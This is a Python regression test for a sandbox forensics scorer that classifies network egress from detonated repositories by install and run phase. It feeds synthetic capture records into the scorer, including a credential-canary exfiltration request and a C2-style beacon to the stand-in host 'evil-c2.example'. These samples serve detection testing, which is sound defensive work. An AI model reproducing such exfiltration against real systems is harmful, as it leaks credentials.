#!/usr/bin/env python3
"""
test_assemble_forensics.py — regression tests for the PHASE-AWARE egress classification
in assemble-forensics.py: a BUILD-phase dependency fetch to a recognized software-
distribution host must NOT score as a confirmed attack, while every genuine attack
indicator — a credential/canary exfil, an actual credential-file read, ANY run-phase
network attempt, a build-phase fetch to an unrecognized host, or a refused pinned/mTLS
handshake — keeps FULL weight regardless of phase. This locks in the fix for the real
false positive it corrects (react/react scoring "Malicious" for a normal `yarn install`
dependency fetch to downloads.sourceforge.net) without softening real attack detection.

This is an END-TO-END test: it writes a synthetic capture.jsonl (the exact schema
forge_addon.py emits, including the guest's phase-marker beacon) and invokes
assemble-forensics.py as a real subprocess — precisely how orchestrate-microvm.sh
does — then asserts on the parsed forensic record.

Run: python3 sandbox/microvm/test_assemble_forensics.py   (exit 0 = all pass)
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ASSEMBLE = os.path.join(HERE, "assemble-forensics.py")

CANARY = "CR-CANARY-DO-NOT-EXFIL-deadbeef0123456789"
TELEMETRY_HOST = "cr-harness.cr.internal"

_fails: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        print(f"  PASS  {name}")
    else:
        print(f"  FAIL  {name}  {detail}")
        _fails.append(name)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def http_line(host: str, t: float, path: str = "/", body: str = "", port: int = 443) -> dict:
    """One forge-captured http_request line (mirrors forge_addon.py's `_emit()` schema)."""
    return {
        "kind": "http_request", "scheme": "https", "host": host, "sni": host,
        "connected_ip": "169.254.0.1", "port": port, "method": "GET", "path": path,
        "http_version": "HTTP/1.1", "headers": {}, "body_b64": _b64(body),
        "body_len": len(body), "t": t,
    }


def observation_line(t: float, **obs_overrides) -> dict:
    """The guest's main telemetry POST (detonate.py `emit()`), captured at /cr-telemetry."""
    obs = {
        "schema": "claude-rabbit/in-guest-observation/1", "project_type": "node",
        "package_manager": "npm", "auto_build_succeeded": True, "build_strategy": "npm — native",
        "ran_without_crash": True,
        "observed": {"credential_reads": [], "exec_count": 1, "connect_count": 0},
        "containment_probe_contained": True, "udp_egress_contained": True,
        **obs_overrides,
    }
    return http_line(TELEMETRY_HOST, t, path="/cr-telemetry", body=json.dumps(obs))


def marker_line(t: float, phase: str = "run_start") -> dict:
    """The guest's install-end/run-start beacon (detonate.py `emit_phase_marker`)."""
    return http_line(TELEMETRY_HOST, t, path="/cr-phase-marker", body=json.dumps({"phase": phase}))


def refused_line(sni: str, t: float) -> dict:
    """A refused (pinned/mTLS) handshake (forge_addon.py `tls_failed_client`)."""
    return {"kind": "tls_intercept_refused", "sni": sni, "t": t,
            "note": "client refused our forged leaf"}


def run_assemble(lines: list[dict]) -> dict:
    """Write `lines` as a capture.jsonl and invoke the REAL assemble-forensics.py CLI."""
    with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False, encoding="utf-8") as f:
        for ln in lines:
            f.write(json.dumps(ln) + "\n")
        path = f.name
    try:
        out = subprocess.run(
            [sys.executable, ASSEMBLE, path, "--owner", "o", "--repo", "r", "--sha", "deadbeef"],
            capture_output=True, text=True, timeout=30, check=True,
        )
        return json.loads(out.stdout)
    finally:
        os.unlink(path)


# ── 1) The known-malicious case: canary exfil MUST still score Malicious/attack,
#      regardless of phase — the check that matters most: the fix must never soften
#      real credential exfiltration. ────────────────────────────────────────────────
rec = run_assemble([
    http_line("evil-c2.example", 100.0, body=f"data={CANARY}"),  # BUILD-phase exfil
    marker_line(500.0),
    observation_line(600.0),
])
check("canary exfil: attack_egress_intercepted true", rec["verdict"]["attack_egress_intercepted"] is True)
check("canary exfil: one_word Malicious", rec["verdict"]["one_word"] == "Malicious")
check("canary exfil: score in the dangerous band", rec["verdict"]["dynamic_score"] <= 45,
      f'got {rec["verdict"]["dynamic_score"]}')
check("canary exfil: host in captured_network_intent (attack-grade)",
      "evil-c2.example" in rec["verdict"]["captured_network_intent"])
check("canary exfil: NOT downgraded to supply_chain_egress",
      "evil-c2.example" not in rec["verdict"]["supply_chain_egress"])

# ── 2) THE FALSE POSITIVE THIS FIX EXISTS FOR: a BUILD-phase fetch to a recognized
#      software-distribution host (github/sourceforge), no credential involvement —
#      must NOT read as a confirmed attack. Mirrors the real react/react run. ──────
rec = run_assemble([
    http_line("downloads.sourceforge.net", 100.0, body="binary-blob-not-a-secret"),  # BUILD-phase
    marker_line(500.0),
    observation_line(600.0, auto_build_succeeded=False),  # mirrors react/react: did not build
])
check("build-phase sourceforge fetch: attack_egress_intercepted FALSE",
      rec["verdict"]["attack_egress_intercepted"] is False, f'got {rec["verdict"]}')
check("build-phase sourceforge fetch: one_word NOT Malicious/Dangerous",
      rec["verdict"]["one_word"] not in ("Malicious", "Dangerous"),
      f'got {rec["verdict"]["one_word"]!r}')
check("build-phase sourceforge fetch: NOT in captured_network_intent",
      "downloads.sourceforge.net" not in rec["verdict"]["captured_network_intent"])
check("build-phase sourceforge fetch: IS in supply_chain_egress",
      "downloads.sourceforge.net" in rec["verdict"]["supply_chain_egress"])
check("build-phase sourceforge fetch: score modestly reduced, not attack-tier",
      85 <= rec["verdict"]["dynamic_score"] <= 95, f'got {rec["verdict"]["dynamic_score"]}')
check("build-phase sourceforge fetch: containment narrative still names the host",
      "downloads.sourceforge.net" in rec["containment"]["containment_notes"],
      f'notes={rec["containment"]["containment_notes"]!r}')

# ── 3) The SAME kind of host, but the fetch happens AFTER run_start (RUN phase) —
#      phase-awareness must cut BOTH ways: a github fetch while the code is EXECUTING
#      (not installing) is not a benign build-time dependency resolution. ──────────
rec = run_assemble([
    marker_line(500.0),
    http_line("github.com", 700.0, body="phoning-home"),  # after the marker -> run-phase
    observation_line(800.0),
])
check("run-phase github fetch: attack_egress_intercepted TRUE (not softened)",
      rec["verdict"]["attack_egress_intercepted"] is True)
check("run-phase github fetch: in captured_network_intent, not supply_chain_egress",
      "github.com" in rec["verdict"]["captured_network_intent"]
      and "github.com" not in rec["verdict"]["supply_chain_egress"])

# ── 4) BUILD-phase fetch to an UNRECOGNIZED host — not a known distribution host, so
#      it must NOT be downgraded even though it happened during the build. ─────────
rec = run_assemble([
    http_line("evil-c2.example", 100.0, body="c2-beacon-not-a-credential"),  # BUILD-phase, unknown host
    marker_line(500.0),
    observation_line(600.0),
])
check("build-phase unrecognized-host fetch: still attack-grade",
      rec["verdict"]["attack_egress_intercepted"] is True)
check("build-phase unrecognized-host fetch: not in supply_chain_egress",
      "evil-c2.example" not in rec["verdict"]["supply_chain_egress"])

# ── 5) A refused (pinned/mTLS) handshake during the BUILD phase to a recognized
#      distribution host — must NEVER be softened (encrypted C2 we could not inspect
#      is always the strongest kind of "we don't know what that was"). ────────────
rec = run_assemble([
    refused_line("github.com", 100.0),  # BUILD-phase, but REFUSED — never downgraded
    marker_line(500.0),
    observation_line(600.0),
])
check("refused pinned handshake (build-phase, distribution host): still attack-grade",
      rec["verdict"]["attack_egress_intercepted"] is True)
check("refused pinned handshake: score reflects the refused penalty",
      rec["verdict"]["dynamic_score"] <= 80, f'got {rec["verdict"]["dynamic_score"]}')

# ── 6) NO phase marker at all (older capture / a lost beacon) — phase is UNKNOWN, so
#      the fetch must NOT be downgraded: a missing marker fails toward the STRONGER
#      classification, never a softer one. ─────────────────────────────────────────
rec = run_assemble([
    http_line("github.com", 100.0, body="dependency-fetch"),  # no marker in this capture at all
    observation_line(600.0),
])
check("no phase marker present: fetch NOT downgraded (conservative default)",
      rec["verdict"]["attack_egress_intercepted"] is True, f'got {rec["verdict"]}')
check("no phase marker present: not in supply_chain_egress",
      "github.com" not in rec["verdict"]["supply_chain_egress"])

# ── 7) A clean run with ONLY a build-phase supply-chain fetch — the containment
#      narrative must still name the host (no empty-parens regression) and the raw
#      capture still shows up in network_intent.attempts (full transparency), even
#      though it is excluded from the attack-grade destinations. ───────────────────
rec = run_assemble([
    http_line("raw.githubusercontent.com", 100.0, body="a-vendored-file"),
    marker_line(500.0),
    observation_line(600.0),
])
check("clean supply-chain-only run: attempts list still shows the raw capture (transparency)",
      any(a["intended_host"] == "raw.githubusercontent.com" for a in rec["network_intent"]["attempts"]))
check("clean supply-chain-only run: intended_destinations excludes it (attack-grade only)",
      not any(d["host"] == "raw.githubusercontent.com" for d in rec["network_intent"]["intended_destinations"]))
check("clean supply-chain-only run: no crash / no empty-parens in containment notes",
      "()" not in rec["containment"]["containment_notes"],
      f'notes={rec["containment"]["containment_notes"]!r}')

# ── 8) Real bug fix: the SAME underlying request captured twice (identical
#      host/method/path/body/timestamp — e.g. logged by two observers) must
#      collapse to ONE row in network_intent.attempts, never a visible
#      duplicate. A genuine RETRY (same everything, but a DIFFERENT capture
#      timestamp) must still show as its own, distinct row. ────────────────
rec = run_assemble([
    http_line("storage.googleapis.com", 100.0, path="/x", body="dup"),
    http_line("storage.googleapis.com", 100.0, path="/x", body="dup"),  # exact duplicate capture
    http_line("storage.googleapis.com", 150.0, path="/x", body="dup"),  # a real retry, later
])
_dupe_matches = [
    a for a in rec["network_intent"]["attempts"]
    if a["intended_host"] == "storage.googleapis.com" and a["http_path"] == "/x"
]
check("an exact duplicate capture (same request, same timestamp) shows once, not twice",
      len(_dupe_matches) == 2, f"got {len(_dupe_matches)} rows: {_dupe_matches}")

# ── 9) Real bug fix: the honesty note must name WHICH phase actually failed —
#      install/build itself vs. a build that succeeded but whose run crashed —
#      rather than one generic "did not build" sentence for both. Real repos
#      (this project's own, and AmrDab/clawdcursor) have a genuine root
#      package.json the harness correctly detects and builds; a report
#      claiming "did not build" when the build genuinely succeeded is simply
#      false. ─────────────────────────────────────────────────────────────
rec = run_assemble([
    observation_line(600.0, auto_build_succeeded=False, ran_without_crash=False),
])
check("build itself failed: honesty note says install/build, not a blanket 'did not build'",
      any("install/build step did not complete" in n for n in rec["honesty"]["notes"]),
      f'notes={rec["honesty"]["notes"]!r}')

rec = run_assemble([
    observation_line(600.0, auto_build_succeeded=True, ran_without_crash=False),
])
check("build succeeded but run crashed: honesty note says so precisely, not 'did not build'",
      any("built successfully, but its run command did not complete cleanly" in n for n in rec["honesty"]["notes"]),
      f'notes={rec["honesty"]["notes"]!r}')
check("build succeeded but run crashed: does NOT falsely claim the build failed",
      not any("did not build and run to clean completion" in n for n in rec["honesty"]["notes"]),
      f'notes={rec["honesty"]["notes"]!r}')

rec = run_assemble([
    observation_line(600.0, auto_build_succeeded=True, ran_without_crash=True),
])
check("build AND run both succeeded: no dormant/unverified honesty note at all",
      len(rec["honesty"]["notes"]) == 0, f'notes={rec["honesty"]["notes"]!r}')

print()
if _fails:
    print(f"FAILED: {len(_fails)} check(s): {_fails}")
    sys.exit(1)
print("ALL PHASE-AWARE CLASSIFICATION CHECKS PASSED")
